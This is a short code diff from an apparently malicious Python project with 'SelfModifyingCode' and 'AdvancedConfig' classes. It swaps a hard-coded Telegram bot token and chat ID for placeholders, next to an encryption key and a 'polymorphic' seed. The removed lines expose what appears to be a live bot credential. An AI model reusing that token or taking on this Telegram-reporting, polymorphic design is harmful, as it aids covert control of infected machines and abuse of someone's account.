@@ -2405,8 +2405,8 @@ class SelfModifyingCode:
             return False
 class AdvancedConfig:
     def __init__(self):
-        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', '8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I')
-        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', '7368280792')
+        self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
+        self.TG_CHAT_ID = os.environ.get('TG_CHAT_ID', 'YOUR_CHAT_ID_HERE')
         self.TELEGRAM_LANGUAGE = "ru"
         self.ENCRYPTION_KEY = Fernet.generate_key()
         self.POLYMORPHIC_SEED = random.randint(1000, 9999)
